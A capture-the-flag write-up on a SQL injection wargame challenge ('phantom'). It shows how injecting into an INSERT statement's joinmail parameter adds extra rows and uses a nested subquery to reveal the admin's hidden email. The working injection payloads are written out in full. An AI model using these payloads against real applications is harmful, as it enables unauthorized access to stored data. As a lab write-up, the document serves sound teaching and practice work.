---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 29
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/8ce4405e-0c17-402b-a401-b67dc208a082)

We are provided with the SQL query:

```sql
INSERT INTO prob_phantom VALUES(0,'{$_SERVER[REMOTE_ADDR]}','{$_GET[joinmail]}')
```

This time, the table is updated based upon the parameter value that we provide.
If the `no=1`, the email will be displayed as `**************`.

In order to solve this challenge, we need to insert multiple records at the same time.
This can be done by listing multiple records in parentheses after `VALUES`, as follows:

```sql
INSERT INTO [table_name] VALUES(1, 1, 1), (2, 2, 2), (3, 3, 3);
```

If we provide the following URI parameter:

```
?joinmail=test'), (0, '[Public IP address]', (SELECT 1 WHERE 1=1)) -- -
```

You can find your public IP address from [here](https://www.whatismyip.com/).

The resultant query becomes:

```sql
INSERT INTO prob_phantom VALUES(0,'{$_SERVER[REMOTE_ADDR]}','test'), (0, '[Public IP address]', (SELECT 1 WHERE 1=1)) -- -')
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/dee7cf90-3667-4e1f-8a0a-4e6229687d00)

As we can see, the two records have been inserted into the table.

In order to retrieve the email however, we will have to store it into a variable.

```
?joinmail=test'), (0, '[Public IP address]', (SELECT * FROM (SELECT email FROM prob_phantom WHERE no=1) AS temp)) -- -
```

The resultant query becomes:

```sql
INSERT INTO prob_phantom VALUES(0,'{$_SERVER[REMOTE_ADDR]}','test'), (0, '[Public IP address]', (SELECT * FROM (SELECT email FROM prob_phantom WHERE no=1) AS temp)) -- -')
```

The above query will store

![3](https://github.com/Kunull/Write-ups/assets/110326359/335cb5bf-340f-4f1a-858d-6b2d4ecc55b4)

```
admin_secure_email@rubiya.kr
```

If we provide the following URI:

```
?email=admin_secure_email@rubiya.kr
```

The resultant query becomes:

```sql
SELECT email FROM prob_phantom WHERE no=1 AND email='?email=admin_secure_email@rubiya.kr'
```

![4](https://github.com/Kunull/Write-ups/assets/110326359/b1560a1f-4a62-453e-ac4f-1c1a0be9a911)
